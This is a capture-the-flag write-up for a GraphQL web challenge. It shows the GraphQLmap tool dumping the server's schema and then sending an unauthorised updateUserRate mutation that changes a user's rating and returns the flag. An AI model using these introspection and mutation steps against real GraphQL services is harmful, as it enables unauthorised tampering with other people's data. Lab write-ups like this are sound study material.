# Rank yourself higher
Category: Web, 250 points

## Description

> challenge 3 in Imperva's GQLDating series
> 
> Check your rate. Do you truly agree to be ranked that low? If you will be ranked 100 you will get more exposure.


## Solution

This is the follow up for [GQL all the way](GQL_all_the_way.md). We'll continue using `GraphQLmap` to interact with the GraphQL engine.

```console
┌──(user@kali)-[/media/sf_CTFs/technion/Rank_yourself_higher]
└─$ python3 ~/utils/web/GraphQLmap/graphqlmap.py -u http://ec2-3-239-182-16.compute-1.amazonaws.com:1234/gql/graphql?query={} -v --method POST --json
   _____                 _      ____  _
  / ____|               | |    / __ \| |
 | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __
 | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \
 | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/
                  | |                                       | |
                  |_|                                       |_|
                              Author: @pentest_swissky Version: 1.0
GraphQLmap > dump_new
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)

User
        name[]:
        email[]:
        rate[]:
Flag
        hint[]:
        key[]:
FlagResult
        success[Boolean]:
        errors[String]:
        flag[]:
Person
        id[ID]:
        nickname[]:
        name[]:
        last_name[]:
        joined_at[]:
        city[]:
        interest_in[]:
        gender[]:
        personal_info[]:
        link[]:
PersonRate
        id[ID]:
        nickname[]:
        name[]:
        last_name[]:
        rate[]:
PersonResult
        success[Boolean]:
        errors[String]:
        person[]:
PersonsResult
        success[Boolean]:
        errors[String]:
        persons[Person]:
PersonRateResult
        success[Boolean]:
        errors[String]:
        person_rate[]:
UserResult
        success[Boolean]:
        errors[String]:
        user[]:
Post
        id[ID]:
        title[String]:
        description[String]:
        created_at[String]:
PostResult
        success[Boolean]:
        errors[String]:
        post[]:
PostsResult
        success[Boolean]:
        errors[String]:
        posts[Post]:
Query
        getFlag[FlagResult]:
        listPosts[PostsResult]:
        getPost[PostResult]: id (ID!),
        listPersons[PersonsResult]:
        getPerson[PersonResult]: id (ID!),
        getPersonByName[PersonsResult]: name (!),
        getPersonByNickName[PersonResult]: nickname (!),
        getPersonRate[PersonRateResult]: id (ID!),
        getUser[UserResult]: email (String!),
Mutation
        createPost[PostResult]: title (String!), description (String!), created_at (!),
        updatePost[PostResult]: id (ID!), title (!), description (!),
        deletePost[PostResult]: id (!),
        updatePersonRate[PersonRateResult]: id (ID!), rate (Int!),
        updateUserRate[UserResult]: email (String!), rate (Int!),
__Schema
__Type
__Field
__InputValue
__EnumValue
__Directive
GraphQLmap >
```

So for this challenge we just need to rank ourselves higher (essentially ranking anyone higher did the trick):

```
GraphQLmap > mutation{updateUserRate(email:"Test@test.com", rate: 100){success errors user {name email rate} }}
mutation{updateUserRate(email:"Test@test.com", rate: 100){success errors user {name email rate} }}
{
    "data": {
        "updateUserRate": {
            "errors": null,
            "success": true,
            "user": {
                "email": "Test@test.com",
                "name": "Test",
                "rate": "cstechnion{b00m!_w3ll_d0n3_}"
            }
        }
    }
}
```

The flag: `cstechnion{b00m!_w3ll_d0n3_}`.